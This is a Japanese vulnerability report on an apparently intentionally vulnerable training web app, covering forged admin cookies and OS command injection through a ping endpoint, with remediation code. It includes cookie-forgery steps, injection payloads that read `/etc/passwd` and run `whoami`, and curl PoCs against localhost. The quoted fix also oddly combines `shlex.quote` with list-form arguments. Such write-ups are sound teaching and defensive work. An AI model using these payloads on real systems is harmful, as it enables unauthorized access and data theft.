# 権限昇格脆弱性レポート

## 発見された脆弱性

### 1. Cookieベース権限昇格 (Critical)

**場所:** `app/routes/admin.py` の全管理者機能  
**CVSS:** 9.8 (Critical)

**脆弱性の詳細:**
```python
is_admin = request.cookies.get('is_admin', 'false')
admin_check = is_admin.lower() in ['true', '1', 'yes']
```

**攻撃手順:**
1. 通常ユーザーでログイン
2. ブラウザの開発者ツールでCookieを編集:
   - `is_admin=true`
   - `user_id=1` 
   - `role=admin`
3. 管理者ページにアクセス → 成功

### 2. コマンドインジェクション (Critical)

**場所:** `/admin/system` エンドポイント  
**CVSS:** 10.0 (Critical)

**脆弱性の詳細:**
```python
cmd = f'ping -n 4 {target}'
result = subprocess.check_output(cmd, shell=True, text=True, timeout=15)
```

**攻撃例:**
```
GET /admin/system?target=127.0.0.1%26%26whoami
GET /admin/system?target=127.0.0.1%3Bcat%20/etc/passwd
GET /admin/system?target=127.0.0.1%7Cdir
```

### 3. 弱い権限チェック (High)

**場所:** `/admin/system` のuser_id チェック  
**脆弱性:** 
```python
if user_id == '1':  # 文字列比較、容易に偽装可能
```

## 攻撃シナリオ

### シナリオ1: 完全な権限奪取
1. **初期アクセス:** 通常ユーザーアカウント取得
2. **権限昇格:** Cookie操作で管理者権限偽装
3. **データ窃取:** 全ユーザー情報の取得
4. **永続化:** 管理者アカウント作成
5. **横移動:** コマンドインジェクションでシステム侵害

### シナリオ2: リモートコード実行
1. Cookie操作で管理者権限取得
2. `/admin/system?target=...` でコマンドインジェクション
3. リバースシェル起動
4. サーバー完全制御

## 影響範囲

### アクセス可能な管理者機能:
- ✅ `/admin` - 管理者ダッシュボード
- ✅ `/admin/users` - ユーザー管理 (個人情報漏洩)
- ✅ `/admin/orders` - 注文管理 (決済情報漏洩)
- ✅ `/admin/products` - 商品管理 (改ざん可能)
- ✅ `/admin/reviews` - レビュー管理 (改ざん可能)
- ✅ `/admin/system` - システム管理 (RCE可能)

### 攻撃可能な操作:
- ユーザーアカウント削除・編集
- 商品情報の改ざん・削除
- 注文データの改ざん
- システム情報の窃取
- OSコマンドの実行
- ファイルシステムへのアクセス

## PoC (Proof of Concept)

### ブラウザでの手動攻撃:
1. F12で開発者ツールを開く
2. Applicationタブ → Cookies
3. 以下を設定:
   ```
   is_admin = true
   user_id = 1
   role = admin
   ```
4. `/admin` にアクセス → 管理者ダッシュボード表示

### コマンドインジェクション:
```bash
# ユーザー情報取得
curl "http://localhost:5000/admin/system?target=127.0.0.1%26%26whoami" \
  -H "Cookie: is_admin=true; user_id=1; role=admin"

# ディレクトリ一覧
curl "http://localhost:5000/admin/system?target=127.0.0.1%26%26dir" \
  -H "Cookie: is_admin=true; user_id=1; role=admin"

# ファイル読み取り (Linux)
curl "http://localhost:5000/admin/system?target=127.0.0.1%26%26cat%20/etc/passwd" \
  -H "Cookie: is_admin=true; user_id=1; role=admin"
```

## 修正方法

### 1. 適切な権限管理の実装
```python
# 現在（脆弱）
is_admin = request.cookies.get('is_admin', 'false')

# 修正後（安全）
def check_admin_permission():
    user_id = session.get('user_id')
    if not user_id:
        return False
    
    user = safe_database_query(
        "SELECT is_admin FROM users WHERE id = %s", 
        (user_id,), fetch_one=True
    )
    return user and user.get('is_admin', False)
```

### 2. コマンドインジェクションの修正
```python
# 現在（脆弱）
cmd = f'ping -n 4 {target}'
result = subprocess.check_output(cmd, shell=True)

# 修正後（安全）
import shlex
target = shlex.quote(target)  # エスケープ処理
cmd = ['ping', '-n', '4', target]  # 配列形式
result = subprocess.check_output(cmd, shell=False)
```

### 3. セッション管理の強化
```python
# JWTトークンやサーバーサイドセッションの使用
# Cookie改ざん防止の実装
# セッション固定攻撃対策
```

## 学習価値

この脆弱性は以下のセキュリティ概念を学習できます:

1. **権限管理の重要性**
2. **Cookieセキュリティ**
3. **コマンドインジェクション**
4. **権限昇格攻撃**
5. **多段階攻撃**

**この脆弱性により、通常ユーザーが完全な管理者権限を取得し、システム全体を侵害することが可能です。**